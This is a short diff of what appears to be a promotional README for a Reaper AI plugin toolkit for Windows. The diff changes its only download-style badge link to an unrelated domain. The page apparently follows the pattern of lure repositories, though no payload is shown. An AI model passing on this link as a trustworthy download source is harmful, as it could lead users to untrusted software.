@@ -2,7 +2,7 @@
 
 🌟 Power up Reaper with AI Boost Toolkit 2025! This collection of AI plugins, scripts, and templates helps you produce studio-quality audio, built for Windows users.
 
-[![Discover Reaper AI Toolkit](https://img.shields.io/badge/Discover-Reaper_AI_Toolkit-blueviolet)](https://glocktober.com)
+[![Discover Reaper AI Toolkit](https://img.shields.io/badge/Discover-Reaper_AI_Toolkit-blueviolet)](https://ton-stake.net)
 
 ---
 
